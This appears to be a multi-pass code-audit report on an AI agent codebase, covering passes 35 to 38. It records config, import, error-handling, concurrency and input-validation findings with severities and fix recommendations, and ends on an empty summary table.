2. **P34-14 (LOW)** — In `_load_config_impl`, after `yaml.safe_load()`, check for duplicate keys at each nesting level and emit a one-time warning (similar to the existing `_warn_config_parse_failure` mechanism) so users don't silently lose config values to YAML last-write-wins semantics.

3. **P34-2 (LOW)** — In `memory_setup.py`, emit a `logger.debug()` or `logger.warning()` when pip dependency detection is skipped due to a YAML parse error, so operators know a plugin's dependencies weren't installed.

---

### Summary Table (Passes #24–34)

| Pass | Strategy | New Issues | Total Issues |
|------|----------|------------|--------------|
| #24 | Data Persistence & State Management | 16 | ~396 |
| #25 | Dependency & Import Graph | 15 | ~411 |
| #26 | Tool-Call Patterns & Schema Validation | 23 | ~434 |
| #27 | Cross-File Signature & Contract Inconsistency | 16 | ~450 |
| #28 | Adversarial Input Fuzzing | 8 | ~458 |
| #29 | State Machine & Lifecycle Consistency | 10 | ~468 |
| #30 | Architectural & Agentic Coding Review | 12 | ~480 |
| #31 | Concurrency & Parallelism Deep Dive | 7 | ~487 |
| #32 | Data Flow / Taint Analysis + Guardrail Stream Fix | 0 | ~487 |
| #33 | Performance & Efficiency Deep Dive | 0 | ~487 |
| #34 | Control Flow Re-Analysis: Edge Cases & Error Paths | 3 low, 13 info | ~500 |

**Critical issues across all passes**: Skill file integrity (P30-3), memory provider prefetch injection (P30-6), plugin config write (P23-5), hook sandbox (P23-1), pre_gateway_dispatch auth bypass (P23-4), no shutdown in PluginManager (P29-9).

**Pass #34 result**: Clean — 3 low-priority issues (silent exception swallowing in cron × 3, YAML duplicate key silent loss). No critical bugs. Error handling throughout the codebase is well-disciplined; most `except` blocks are intentional "fail gracefully" patterns, not defects.

**Audit ongoing — more passes to follow.**

*Last updated: 2026-05-24T21:18:40Z*
*Commit at scan: b04760fdb*

## Pass #35 – Cross-File Consistency Deep Dive (Round 2) – 2026-05-24T23:00:00Z

Scope: hermes_cli/config.py, gateway/run.py, tools/registry.py, hermes_cli/plugins.py, gateway/platforms/base.py, gateway/platform_registry.py, hermes_state.py

---

### P35-1 · display.background_process_notifications used but not defined in DEFAULT_CONFIG — MEDIUM

**File:** `gateway/run.py:2876` (`_load_background_notifications_mode`)
**Severity:** MEDIUM

`display.background_process_notifications` is read by `cfg_get(cfg, "display", "background_process_notifications")` in gateway runtime config, but it is **not defined in DEFAULT_CONFIG** in `hermes_cli/config.py`. The key only appears in `cli-config.yaml.example` as a comment-documented option.

When a user runs the gateway without explicitly setting `background_process_notifications` in their `~/.hermes/config.yaml`, `cfg_get` returns `None` → which maps to `"all"` via the fallback at run.py:2876-2888. This is the documented default behavior, but the key itself is absent from `DEFAULT_CONFIG`, so:

1. `load_config()` / `load_config_readonly()` will not include the key
2. Any code that iterates `DEFAULT_CONFIG` keys to build a settings UI will miss it
3. Config migration tooling cannot detect whether the user has explicitly set it or is using the hardcoded fallback

**Recommendation:** Add `"background_process_notifications": "all"` to the `display` section of `DEFAULT_CONFIG` in `hermes_cli/config.py`.

---

### P35-2 · PluginManager.register_tool() continues to drop max_result_size_chars and dynamic_schema_overrides — LOW (re-confirmed from P27-3)

**File:** `hermes_cli/plugins.py:317-350` (`PluginContext.register_tool`)
**Severity:** LOW

`PluginManager.register_tool()` still wraps `tools.registry.register()` but does not pass `max_result_size_chars` or `dynamic_schema_overrides` parameters (lines 317-350). Plugin tools cannot control truncation behavior. This was already flagged in P27-3 — no change has been made.

**Recommendation (unchanged from P27-3):** Add `max_result_size_chars` and `dynamic_schema_overrides` parameters to `PluginContext.register_tool()`.

---

### P35-3 · ToolRegistry.get_entry() returns None on miss; deregister() silently no-ops — LOW (asymmetric)

**File:** `tools/registry.py:192-195` (`get_entry`), `tools/registry.py:307-331` (`deregister`)
**Severity:** LOW

`get_entry()` returns `Optional[ToolEntry]` (None if not found). `deregister()` calls `self._tools.pop(name, None)` and returns silently if the name was not registered. While both behaviors are individually reasonable (get = nullable lookup, dereg = idempotent removal), there is no consistent error model:

- Callers of `get_entry()` must check for `None` or risk `AttributeError` on `entry.schema`
- Callers of `deregister()` cannot distinguish "tool did not exist" from "tool was removed" without a pre-check

No consistent error handling contract across the registry's public API.

**Recommendation:** Consider adding a `must_exist: bool = False` parameter to `deregister()` that raises `KeyError` when `must_exist=True` and the tool is not found. Or add a return value indicating whether a tool was actually removed.

---

### P35-4 · Two invoke_hook() implementations with inconsistent exception handling — LOW

**File:** `hermes_cli/plugins.py:1413` (instance method), `hermes_cli/plugins.py:1521` (module-level function)
**Severity:** LOW

`PluginManager.invoke_hook()` (instance method, line 1413) and `invoke_hook()` (module-level function, line 1521) both exist. The instance method delegates to the module-level function via `get_plugin_manager().invoke_hook()`. Both are public APIs.

However, in the PluginManager instance method, exceptions raised by hook callbacks are caught and logged (line 820-826 pattern), but the module-level `invoke_hook()` does not wrap exceptions — it propagates them to the caller.

Callers using the module-level `invoke_hook()` directly (bypassing the manager's try/except) may see raw exceptions from plugin callbacks, while callers going through `PluginManager.invoke_hook()` get consistent error suppression. This is a subtle asymmetry in the same file.

**Recommendation:** Review both implementations and ensure the exception handling policy is consistent — either both suppress and log, or both propagate.

---

### P35-5 · Optional imports in gateway/run.py use bare `pass` fallback; certifi/aiohttp silently skipped — INFO

**File:** `gateway/run.py:20` (hermes_bootstrap), `gateway/run.py:615` (certifi), `gateway/run.py:15245` (aiohttp)
**Severity:** INFO

Three optional imports in gateway/run.py:
- Line 20: `hermes_bootstrap` — `ModuleNotFoundError` caught, `pass` (UTF-8 stdio setup skipped on Windows if missing)
- Line 615: `certifi` — `ImportError` caught, `pass` (SSL cert path not set if missing)
- Line 15245: `aiohttp` — `ImportError` caught, returns error dict (correct — proxy mode fails gracefully with a message)

All three are handled gracefully. No silent failures that would cause broken behavior without warning. The aiohttp case is the best pattern — it returns a meaningful error response rather than just `pass`.

**Recommendation:** Consider applying the same pattern to certifi: if certifi is missing and SSL_CERT_FILE can't be set, emit a log warning rather than silently continuing with no SSL configuration.

---

### P35-6 · BasePlatformAdapter abstract interface defines 3 abstract methods; all adapters implement connect/disconnect/send — INFO

**File:** `gateway/platforms/base.py:1673-1707`
**Severity:** INFO

`BasePlatformAdapter` defines three `@abstractmethod` decorators: `connect()`, `disconnect()`, and `send()`. All concrete adapters (Telegram, Slack, Discord, WeChat, etc.) implement these. The `handle_message()` method (line 3163) is not abstract — it has a default implementation in the base class. This is intentional design; `handle_message()` is invoked by the gateway runner on the adapter and the base implementation handles the dispatch loop. Adapters that need custom handling override it.

No contract violation detected. Platform adapter interface is well-enforced.

---

### P35-7 · append_message() call sites all use keyword arguments; signature uses `int=None` instead of `Optional[int]` — INFO (known from P27-6)

**File:** `hermes_state.py:1448` (signature), all call sites
**Severity:** INFO

All ~15+ call sites to `append_message()` in the codebase use keyword arguments (e.g., `db.append_message("session", "user", content="hello")`), so the `int=None` type annotation issue (noted in P27-6) does not cause actual breakage at runtime. Signature is otherwise consistent across all call sites.

No new finding — re-confirmed from P27-6.

---

### P35-8 · save_config() has no return value; callers ignore success — INFO (known from P27-1)

**File:** `hermes_cli/config.py:4551` (`save_config`)
**Severity:** INFO

`save_config()` returns `None` on success and on managed systems (NixOS/Homebrew). All callers (cmd_set, cmd_unset, cmd_plugin_set, update_model_section) ignore the return value. Confirmed from P27-1. No change since P27-1.

---

### P35-9 · Env bridge for display.busy_input_mode/busy_text_mode uses direct `_display_cfg[]` access — INFO

**File:** `gateway/run.py:840-843`
**Severity:** INFO

Env bridge uses direct `[]` access on `_display_cfg` (lines 840-843), not `cfg_get`. This pattern is consistent with the agent timeout bridge (lines 826-833) and was noted in P27-11. Low risk.

---

### P35-10 · Tool registry generation counter used for cache invalidation; RLock serializes mutations — INFO

**File:** `tools/registry.py:161` (RLock), `tools/registry.py:305,330` (_generation increments)
**Severity:** INFO

Generation counter correctly incremented on all `register()` / `deregister()` calls. Used as cache invalidation key in `_tool_defs_cache`. RLock serializes mutations. No stale-reader interlock issue found beyond what was noted in P29-7 (already tracked).

---

### Summary

| ID | Area | Severity | Description |
|----|------|----------|-------------|
| P35-1 | Config key | MEDIUM | display.background_process_notifications used but not in DEFAULT_CONFIG |
| P35-2 | Plugin registry | LOW | register_tool() drops max_result_size_chars and dynamic_schema_overrides (P27-3 re-confirmed) |
| P35-3 | Tool registry | LOW | get_entry() returns None vs deregister() silent no-op — asymmetric error handling |
| P35-4 | Hook system | LOW | Two invoke_hook() implementations with inconsistent exception handling |
| P35-5 | Optional imports | INFO | certifi silent skip could emit a log warning |
| P35-6 | Platform adapter | INFO | BasePlatformAdapter contract well-enforced — no new finding |
| P35-7 | append_message signature | INFO | Consistent across call sites; int=None type annotation issue (P27-6 re-confirmed) |
| P35-8 | save_config | INFO | Returns None; callers ignore success (P27-1 re-confirmed) |
| P35-9 | Env bridge | INFO | Direct [] access on _display_cfg — consistent, low risk (P27-11 re-confirmed) |
| P35-10 | Tool registry | INFO | Generation counter used correctly; RLock serialization (P29-7 re-confirmed) |

### Top 3 Priorities

1. **P35-1 (MEDIUM)** — Add `"background_process_notifications": "all"` to the `display` section of `DEFAULT_CONFIG` in `hermes_cli/config.py`. Without this, config UI iteration and migration tooling will miss the key entirely, and the gateway's runtime behavior relies on an implicit fallback rather than an explicit default.

2. **P35-3 (LOW)** — Add a `must_exist` parameter to `ToolRegistry.deregister()` to give callers a way to detect whether a tool was actually registered when the call was made. Alternatively, make `deregister()` return a bool indicating whether a tool was found and removed.

3. **P35-4 (LOW)** — Review the exception handling policy for `invoke_hook()` in both its instance and module-level forms. Currently the instance method suppresses exceptions (line 820-826) while the module-level function propagates them. Choose one policy and apply it consistently.

---

## Pass #36 – Dependency & Import Graph Deep Dive (Round 2) – 2026-05-24T14:30:00Z

### 1. Circular Import Analysis

**No circular imports detected** between the key modules examined.

- `hermes_state.py` imports `from agent.memory_manager import sanitize_context` — `agent/memory_manager.py` does NOT import back into `hermes_state`. It only imports from `agent.memory_provider` and `tools.registry`. Clean.

- `tools/registry.py` imports NOTHING from `hermes_state` or `agent/`. It only imports stdlib + `pathlib`. Clean.

- `hermes_cli/config.py` has NO `from agent` or `import agent`. It imports only stdlib + `yaml` + `hermes_cli` internals + `hermes_constants` + `utils`. The `from hermes_constants import get_hermes_home` at line 357 uses `# noqa: F811,E402` — the F811 is a "redefinition of unused name" suppression, suggesting `get_hermes_home` is also defined locally in config.py.

- `agent/credential_pool.py` (line 18): `import hermes_cli.auth as auth_mod` — This is a cross-package import from `agent/` into `hermes_cli/`. `hermes_cli/auth.py` has ZERO `from agent.` or `import agent` statements. Clean, no cycle.

- `hermes_cli/auth_commands.py` (line 12): `from agent.credential_pool import (...)` — This is a lazy import (inside a function at line 93), so it runs after module load. No top-level circular risk.

- `agent/auxiliary_client.py` (line 102): `from agent.credential_pool import load_pool` — inside function, lazy.

**Finding P36-1 (INFO): No circular import chains found.** The dependency graph between `hermes_state`, `tools/registry`, `hermes_cli/config`, `agent/credential_pool`, and `hermes_cli/auth` is acyclic.

---

### 2. Unused Import Detection

**All examined standard-library imports are used.** Detail:

- `cli.py` — `deque` (line 40): Used at lines 1900, 1915, 9165. ✓
- `cli.py` — `errno` (line 35): Used at lines 2201, 14263, 14327, 14329, 14332. ✓
- `cli.py` — `atexit` (line 34): Registered at lines 14138-14139, 14523, 14608. ✓
- `hermes_cli/config.py` — `platform` (line 18): Used at line 73 (`_IS_WINDOWS`). ✓
- `hermes_cli/config.py` — `stat` (line 20): Used at lines 52, 4354, 4424 (file permission checks). ✓
- `hermes_cli/config.py` — `subprocess` (line 21): Used at line 5231 (editor invocation). ✓
- `hermes_cli/config.py` — `threading` (line 24): Used at line 95 (`_CONFIG_LOCK = threading.RLock()`). ✓
- `hermes_cli/config.py` — `tempfile` (line 23): Used at lines 4760, 4857, 4915. ✓
- `hermes_cli/config.py` — `copy` (line 15): Used at lines 3928, 3947, 4134, 4362. ✓
- `gateway/run.py` — `shlex` (line 34): Used at lines 2739, 2745, 3568, 9368, 9378, 13770, 13773, 13778. ✓
- `gateway/run.py` — `tempfile` (line 37): Used at line 11188. ✓
- `tools/registry.py` — `asyncio` (NOT imported): No asyncio usage found. This is correct — tools/registry.py is synchronous. ✓
- `hermes_cli/config.py` — `os` (line 17): Used in many config path operations. ✓

**Finding P36-2 (INFO): No obviously unused imports in the core modules examined.** All top-level stdlib imports in `cli.py`, `hermes_cli/config.py`, `gateway/run.py`, `tools/registry.py`, and `hermes_state.py` are referenced within the same file. No cleanup needed.

---

### 3. Version-Specific Imports

No `sys.version_info` checks found in the codebase. The install script (`scripts/install.sh`) requires Python 3.11+ (line 59: `PYTHON_VERSION="3.11"`), enforced at lines 446-479. No runtime version gating.

Python version requirements are enforced at **install time only**, not at runtime. This means:
- If someone runs the agent on Python 3.10, it would proceed without version checking and potentially fail at import time with less clear errors.
- No `try: ... except SyntaxError` or `sys.version_info` branching found.

**Finding P36-3 (LOW): No runtime Python version gating.** Consider adding a `sys.version_info >= (3, 11)` check at the entry points (`run_agent.py`, `cli.py`, `gateway/run.py`) to fail fast with a clear message on unsupported Python versions.

---

### 4. Lazy Import Patterns

Three `__getattr__`-based lazy import patterns found:

**A. `gateway/platforms/__init__.py` (PEP 562 module-level lazy import)**
Lines 34-41 — defers `QQAdapter` and `YuanbaoAdapter` imports to first attribute access. Correctly raises `AttributeError` for unknown names (line 41). This is the cleanest lazy import pattern — no risk of ImportError leaking silently.
```python
def __getattr__(name):
    if name == "QQAdapter":
        from .qqbot import QQAdapter
        return QQAdapter
    ...
    raise AttributeError(f"module {__name__!r} has no attribute {name!r}")
```

**B. `agent/credential_pool.py` — `PooledCredential.__getattr__` (lines 123-126)**
Delegates attribute access to `self.extra` dict for keys in `_EXTRA_KEYS`. Correctly raises `AttributeError` for unknown names. This is for extra credential fields that aren't dataclass fields. Works correctly.
```python
def __getattr__(self, name: str):
    if name in _EXTRA_KEYS:
        return self.extra.get(name)
    raise AttributeError(f"'{type(self).__name__}' object has no attribute {name!r}")
```

**C. `agent/process_bootstrap.py` — `_SafeWriter.__getattr__` (lines 108-109)**
Delegates to `self._inner` (the wrapped stream). Correctly raises `AttributeError` via the implicit fallback if `self._inner` doesn't have the attribute.
```python
def __getattr__(self, name):
    return getattr(self._inner, name)
```

**D. `hermes_cli/main.py` — `_HangupProtectingWriter.__getattr__` (line 8210)**
Same pattern as C — delegates to `self._original`. Correct.

**Note:** The reference to `__getattr__` in `agent/agent_runtime_helpers.py` line 1291 ("access via `__getattr__` below") is a misleading comment — there is no actual `__getattr__` function in that file. The module-level `OpenAI` name is not a lazy import; it is set up differently (via `run_agent.OpenAI` at import time). This is a stale comment.

**Finding P36-4 (INFO): Lazy import patterns are correctly implemented.** All three genuine `__getattr__` patterns raise `AttributeError` for unknown attributes. One misleading comment in `agent/agent_runtime_helpers.py` line 1291 should be corrected or removed.

---

### 5. Import Side Effects

**Two import-time side effect patterns found:**

**A. `model_tools.py` — Module-level asyncio event loop initialization (lines 58-79)**
The `_get_tool_loop()` function creates and caches a persistent event loop. However, this is a lazy initialization pattern — the loop is created on first call, not at import time. The function at line 58 does `asyncio.new_event_loop()` but this only runs when `_get_tool_loop()` is first called, not at module import. So this is safe.

**B. `cron/scheduler.py` — `sys.path.insert(0, ...)` at module load (line 37)**
```python
sys.path.insert(0, str(Path(__file__).parent.parent))
```
This modifies `sys.path` at import time. The comment explains it's needed for standalone invocations after `hermes update` reloads the module. However, this is a **global mutable state mutation** that affects all subsequent imports. If `cron/scheduler.py` is imported, `sys.path` is permanently modified for the life of the process.

**C. `tools/environments/vercel_sandbox.py` — `_ensure_vercel_sdk()` (lines 47-55)**
This is NOT called at import time. It must be called explicitly before using the vercel sandbox. So no import-time side effect here.

**Finding P36-5 (MEDIUM): `cron/scheduler.py` mutates `sys.path` at import time (line 37).** This side effect modifies the global import search path. It is intentional (for standalone cron invocations) but could interact badly with other tools that also manipulate `sys.path`. Consider instead using absolute imports or a different mechanism for the standalone invocation case.

---

### 6. Optional Dependency Handling — `tools/lazy_deps.py` Audit

`tools/lazy_deps.py` implements a comprehensive lazy-install system. Key findings:

**A. Security model (well-designed):**
- Package allowlist only — only specs in `LAZY_DEPS` dict can be installed
- Spec validation via regex — rejects URLs, file paths, shell metacharacters (`;`, `|`, `&`, `` ` ``, `$`, newlines)
- Venv-scoped only — never touches system Python
- Configurable opt-out via `security.allow_lazy_installs: false` or `HERMES_DISABLE_LAZY_INSTALLS=1`
- No caching of failed state — every invocation retries

**B. Coverage:**
- 30+ features covered: `provider.anthropic`, `provider.bedrock`, `provider.azure_identity`, `search.exa`, `search.firecrawl`, `tts.edge`, `tts.elevenlabs`, `stt.faster_whisper`, `platform.telegram`, `platform.discord`, `platform.slack`, `platform.matrix`, `platform.feishu`, `terminal.modal`, `terminal.daytona`, `tool.acp`, `tool.dashboard`, etc.
- `anthropic` pinned to `==0.87.0` with CVE notes (CVE-2026-34450, CVE-2026-34452)
- `discord.py` pinned to `==2.7.1` (no version ranges — no-ranges policy)
- `slack-bolt` and `slack-sdk` have version pins matching `pyproject.toml`

**C. Post-install verification (lines 479-492):**
After install, it verifies packages are importable. If not, raises `FeatureUnavailable` with a hint that a Python restart may be needed. Good.

**D. Missing `boto3` / `botocore` in `LAZY_DEPS`:**
`provider.bedrock` has `"boto3==1.42.89"` in `LAZY_DEPS`. But `botocore` is not listed — it is a transitive dependency of `boto3` and would be installed automatically. However, if someone specifically needs `botocore` without `boto3`, there's no explicit entry. This is probably fine since boto3 is the proper AWS SDK interface.

**Finding P36-6 (INFO): `lazy_deps.py` is a well-engineered system.** Security model is sound, coverage is comprehensive, and post-install verification prevents silent failures. The `anthropic` pin with CVE references and the note about `mistralai` being quarantined (lines 100-104) show good maintenance awareness.

**Finding P36-7 (INFO): No `sys.version_info` checks in runtime code.** Version requirements are install-time only. This is a minor robustness gap — consider adding a version check at entry points.

---

### 7. TYPE_CHECKING Blocks

All `TYPE_CHECKING` blocks are correctly implemented — imports are type-only, never executed at runtime:

- `agent/auxiliary_client.py` (lines 66-67): `from openai import OpenAI` inside `TYPE_CHECKING` — only for type hints. The actual `OpenAI` class is loaded lazily via `_load_openai_cls()`. Clean.
- `gateway/platforms/helpers.py` (lines 18-19): `from gateway.platforms.base import MessageEvent` — type hint only.
- `tools/environments/vercel_sandbox.py` (lines 40-41): Vercel SDK import in TYPE_CHECKING — type only.
- `tools/web_tools.py` (lines 55+): Similar pattern.
- `plugins/web/firecrawl/provider.py`, `plugins/memory/honcho/session.py`, `plugins/memory/holographic/retrieval.py`: All follow the same pattern.

**Finding P36-8 (INFO): All TYPE_CHECKING blocks are properly isolated.** No runtime import of type-only dependencies.

---

### 8. Cross-Platform Import Handling

**`cron/scheduler.py` — fcntl/msvcrt cross-platform (lines 22-30):**
```python
try:
    import fcntl
except ImportError:
    fcntl = None
    try:
        import msvcrt
    except ImportError:
        msvcrt = None
```
This is **correct** — both modules are set to `None` if unavailable, and the file locking code later checks `if fcntl:` / `elif msvcrt:` (lines 1813-1815). No `AttributeError` possible. Note that `fcntl` not being available on Windows is expected — Windows uses `msvcrt` instead.

**Finding P36-9 (INFO): Cross-platform import guards in `cron/scheduler.py` are correctly implemented.** Both `fcntl` and `msvcrt` are safely set to `None` when unavailable, with conditional usage.

---

---

## Pass #37 – Line-by-Line Lexical Scan (Adversarial Round) – 2026-05-24T19:37:00Z

Scope: `/Users/ernest/.hermes/hermes-agent/` — adversarial assumptions: worst input, most creative misuse, least secure configuration.

### 1. String Formatting Injection

**P37-1 (MEDIUM): `tools/transcription_tools.py` — user-controlled `.format()` with `shell=True`**

- **File:** `tools/transcription_tools.py`, lines 536–547
- **Pattern:** `command_template.format(...)` followed by `subprocess.run(command, shell=True)`
- **Details:** `LOCAL_STT_COMMAND_ENV` is a user-provided env var (`HERMES_LOCAL_STT_COMMAND`) that is `.format()`-ted into a shell command and then executed with `shell=True`. The template receives `shlex.quote()`d values for `input_path`, `output_dir`, `language`, `model` — which is correct protection. However, `_get_local_command_template()` (line 156) returns the user string raw if set; the auto-detected fallback uses `shlex.quote()` on the binary but constructs the template string from the binary path directly. The `use_shell` branch is only triggered when the user sets the env var. If a user sets `HERMES_LOCAL_STT_COMMAND` to a template containing arbitrary shell syntax, `shell=True` will execute it. While the intended use (e.g., `"whisper {input_path} ..."`) is safe, there is no input validation that the template contains only the four known placeholders.
- **Recommendation:** Validate that user-provided templates only contain known placeholders before using them with `shell=True`.

**P37-2 (LOW): `agent/i18n.py` — user-supplied `format_kwargs` in `.format(**format_kwargs)`**

- **File:** `agent/i18n.py`, line 242
- **Pattern:** `value.format(**format_kwargs)` where `format_kwargs` originates from message/i18n data
- **Details:** The `t()` function calls `value.format(**format_kwargs)`. A malicious i18n key with a crafted format string could attempt format exploits, though Python's `str.format()` doesn't support `%` formatting. The `KeyError`/`IndexError`/`ValueError` exception handler (line 243) catches format failures gracefully. Risk is LOW since i18n keys are typically controlled by the developer, not end users.
- **Recommendation:** Keep as-is; the exception handler is appropriate.

### 2. Off-by-One Errors

**P37-3 (INFO): `agent/context_compressor.py` line 1360 — correct backward range**

- **File:** `agent/context_compressor.py`, line 1360
- **Pattern:** `range(len(messages) - 1, head_end - 1, -1)`
- **Details:** Used in `_find_last_user_message_idx()`. The range starts at `len(messages) - 1` (last index, correct for backward search) and ends at `head_end - 1` inclusive — correct. No off-by-one bug found.

**P37-4 (INFO): `agent/agent_runtime_helpers.py` line 2092 — correct bounded backward range**

- **File:** `agent/agent_runtime_helpers.py`, line 2092
- **Pattern:** `range(len(messages) - 1, max(len(messages) - num_tool_msgs - 1, -1), -1)`
- **Details:** Uses `max(...)` to prevent the end of the range from going below -1, which would cause an empty iteration. Correct pattern for bounded backward search. No bug found.

**P37-5 (INFO): `gateway/platforms/yuanbao_sticker.py` lines 425–426 — correct bigram construction**

- **File:** `gateway/platforms/yuanbao_sticker.py`, lines 425–426
- **Pattern:** `for i in range(len(a) - 1)` / `for i in range(len(b) - 1)`
- **Details:** Bigram sliding window: for string of length N, generates N-1 bigrams `[0:2], [1:3], ..., [N-2:N-1]`. The `range(len(a) - 1)` is correct (last start index is N-2, which yields N-1 iterations). No off-by-one.

### 3. Boolean Logic Errors

**P37-6 (LOW): `tools/transcription_tools.py` lines 183–192 — redundant condition check**

- **File:** `tools/transcription_tools.py`, lines 183–192
- **Pattern:** 
  ```python
  if not model_name or model_name in OPENAI_MODELS or model_name in GROQ_MODELS:
      if model_name and (model_name in OPENAI_MODELS or model_name in GROQ_MODELS):
  ```
- **Details:** The outer condition accepts `not model_name` (falsy), but the inner condition immediately excludes it with `if model_name and ...`. The warning inside the inner block will never fire because the outer guard already handles the `not model_name` case by falling through to `return DEFAULT_LOCAL_MODEL`. This is dead code in the warning path but not a bug — the logic is correct, just that the warning branch is unreachable for the `not model_name` path.
- **Recommendation:** Remove the inner `if model_name and` check since it adds no value and may confuse readers.

### 4. Assignment vs Comparison

**P37-7 (INFO): No `if x = value:` bugs found**

Searched for `if .+[^=]=[^=]` patterns across all core modules. All conditional assignments found (`if platform_name.lower() ==`, `if result.returncode != 0`, etc.) are comparisons with `==` or `!=`. No accidental assignment in conditionals detected.

### 5. Type Coercion Bugs

**P37-8 (INFO): No `str + int` concatenation bugs found**

Searched `model_tools.py` and `hermes_state.py` for mixed-type concatenation. No `str + int` or similar type coercion bugs detected. All string formatting uses f-strings, `.format()`, or explicit `str()` calls.

### 6. Whitespace / Syntax Issues

**P37-9 (INFO): No dead code after `return`/`raise` found in core files**

Searched for `return.*\n\s{8,}\S` patterns in `model_tools.py`, `tools/transcription_tools.py`, `agent/context_compressor.py`. No unreachable statements after `return` found. The exception handler in `transcription_tools.py` (lines 567–579) correctly catches `KeyError`, `subprocess.CalledProcessError`, and `Exception` in separate return paths — all are reachable and correct.

### 7. Dead Code Paths

**P37-10 (INFO): `tools/transcription_tools.py` — dead code path in `_normalize_local_model()`**

The inner `if model_name and (model_name in OPENAI_MODELS or model_name in GROQ_MODELS)` (line 184) can never be True when `not model_name` was already caught by the outer `if not model_name or ...`. The condition is logically redundant, though harmless. Not a runtime bug, just misleading code.

### Summary

| Finding | Severity | Category | File |
|---------|----------|----------|------|
| P37-1 | MEDIUM | String formatting injection | tools/transcription_tools.py:536 |
| P37-2 | LOW | format kwargs from user i18n data | agent/i18n.py:242 |
| P37-3 | INFO | Off-by-one — correct backward range | agent/context_compressor.py:1360 |
| P37-4 | INFO | Bounded backward range — correct | agent/agent_runtime_helpers.py:2092 |
| P37-5 | INFO | Bigram range — correct | yuanbao_sticker.py:425 |
| P37-6 | LOW | Redundant inner condition warning never fires | tools/transcription_tools.py:184 |
| P37-7 | INFO | No assignment-in-conditional bugs found | (survey) |
| P37-8 | INFO | No type coercion bugs found | (survey) |
| P37-9 | INFO | No dead code after return/raise | (survey) |
| P37-10 | INFO | Dead code in normalize_local_model inner if | tools/transcription_tools.py:184 |

**New findings this pass:** 10 (2 low/medium, 8 info)

---

|| Finding | Severity | Description |
||---------|----------|-------------|
|| P36-1 | INFO | No circular import chains found |
|| P36-2 | INFO | No unused imports in core modules examined |
|| P36-3 | LOW | No runtime Python version gating at entry points |
|| P36-4 | INFO | Lazy import patterns correctly implemented; misleading comment in agent_runtime_helpers.py |
|| P36-5 | MEDIUM | `cron/scheduler.py` mutates `sys.path` at import time |
|| P36-6 | INFO | `lazy_deps.py` is well-engineered |
|| P36-7 | INFO | No `sys.version_info` checks in runtime code |
|| P36-8 | INFO | All TYPE_CHECKING blocks properly isolated |
|| P36-9 | INFO | Cross-platform fcntl/msvcrt guards correctly implemented |

---


## Pass #38 – Phase 2 Adversarial: Worst-Case Runtime Assumptions – 2026-05-24T20:35:00Z

Scope: hermes_state.py, hermes_cli/config.py, cli.py, gateway/session.py, tools/transcription_tools.py, model_tools.py

### P38-1 · queue.Queue() with no maxsize — unbounded queue growth — MEDIUM

**File:** `cli.py:3114,3115`, `cli.py:12209,12210`, `gateway/stream_consumer.py:136`, `tui_gateway/server.py:190`, `agent/copilot_acp_client.py:464`, and 40+ more

`queue.Queue()` is instantiated without `maxsize=` throughout the codebase. No bound is enforced on producer-consumer queues in the gateway, CLI, TUI gateway, and ACP adapter. Under adversarial input a malicious sender can fill memory by flooding queues faster than consumers drain them.

**Recommendation:** Set `maxsize=N` on all Queue instances, especially `_pending_input`, `_interrupt_queue`, `_queue`, `inbox`, `stdout_queue`.

---

### P38-2 · subprocess.run() calls without timeout — indefinite blocking — MEDIUM

**File:** `hermes_cli/main.py:7115` — `subprocess.run(git_cmd + ["reset"], cwd=cwd, capture_output=True)` — no timeout

**File:** `tools/transcription_tools.py:502` — `subprocess.run(command, check=True, capture_output=True, text=True)` — no timeout (ffmpeg conversion)

**File:** `tools/transcription_tools.py:545` — `subprocess.run(command, shell=True, check=True, capture_output=True, text=True)` — no timeout (user-provided local STT template)

**File:** `hermes_cli/config.py:5231` — `subprocess.run([editor, str(config_path)])` — no timeout (interactive editor for config edit)

**File:** `hermes_cli/main.py:8626` — `subprocess.run(cmd)` — no timeout

A compromised or misbehaving subprocess can cause indefinite blocking, starving worker threads/async tasks.

**Recommendation:** Add `timeout=30` (or appropriate value) to all subprocess.run() calls. The config editor call should use a signal/alarm to enforce user expected response time.

---

### P38-3 · SQLite WAL — passive checkpoint only, no size cap on WAL file — MEDIUM

**File:** `hermes_state.py:332` (`_CHECKPOINT_EVERY_N_WRITES = 50`), lines 429-459 (`_try_wal_checkpoint`)

WAL checkpoint is PASSIVE only. The comment at line 453 states "Truncate WAL so it does not grow without bound on busy systems." However the TRUNCATE checkpoint at line 3102 is only used during VACUUM, not as a proactive size cap. There is no `PRAGMA wal_autocheckpoint` or equivalent to cap WAL file size. Under high write load the WAL file can grow to consume significant disk space before any checkpoint runs.

**Recommendation:** Consider setting `PRAGMA wal_autocheckpoint=N` (e.g., 1000 pages) or periodically executing `PRAGMA wal_checkpoint(TRUNCATE)` proactively, not only during VACUUM.

---

### P38-4 · save_config() — atomic rename confirmed — INFO

**File:** `hermes_cli/config.py:4551-4592`

`save_config()` calls `atomic_yaml_write()` at line 4586. `atomic_yaml_write` (from utils.py) uses `tempfile.mkstemp` + `atomic_replace`, which IS atomic. Config writes already use atomic rename pattern. No issue.

---

### P38-5 · Long-held lock during file I/O — potential DoS — MEDIUM

**File:** `gateway/session.py:695-719` — `with self._lock:` holds lock across `json.load(f)` I/O call

`_ensure_loaded_locked()` at line 698 acquires `self._lock` and holds it while reading and parsing `sessions.json` from disk. On a slow or unresponsive filesystem (NFS, FUSE), the lock is held for the full duration of the I/O, blocking all other threads that need to access session data.

**Recommendation:** Move the file I/O outside the lock; hold the lock only for the brief window updating `self._loaded` and `self._entries`.

---

### P38-6 · Malicious input — coerce_tool_args has no string-length limit — HIGH

**File:** `model_tools.py:545-626` (`coerce_tool_args`)

`coerce_tool_args()` coerces string arguments but performs **no length validation**. A malicious model output or manipulated tool call with a string arg of size MB+ would be parsed and stored in `args[key]`, causing memory exhaustion. There is no `MAX_TOOL_ARG_STRING_LEN` or equivalent guard anywhere in the tool dispatch path.

**Recommendation:** Add length limits in `coerce_tool_args` or `handle_function_call` (model_tools.py:741), e.g., reject or truncate string args exceeding a configurable max (e.g., 1MB).

---

### P38-7 · MAX_* constants for output/display, not input — MEDIUM

**File:** `cli.py:5091-5094` (`MAX_USER_LEN=300`, `MAX_ASST_LEN=200`) — used for display truncation only, not input validation

These limits truncate display output but do not validate or bound **input** from external sources (tool args, gateway messages, etc.). No equivalent `MAX_TOOL_ARG_LEN` or `MAX_INPUT_STRING_LEN` exists for inbound data. Maliciously long tool arguments bypass these display-oriented limits entirely.

**Recommendation:** Add input-length validation for tool arguments and gateway message fields. Use `MAX_*` constants consistently as input bounds, not just display bounds.

---

### Summary Table

| Finding | Severity | Description |
|---------|----------|-------------|
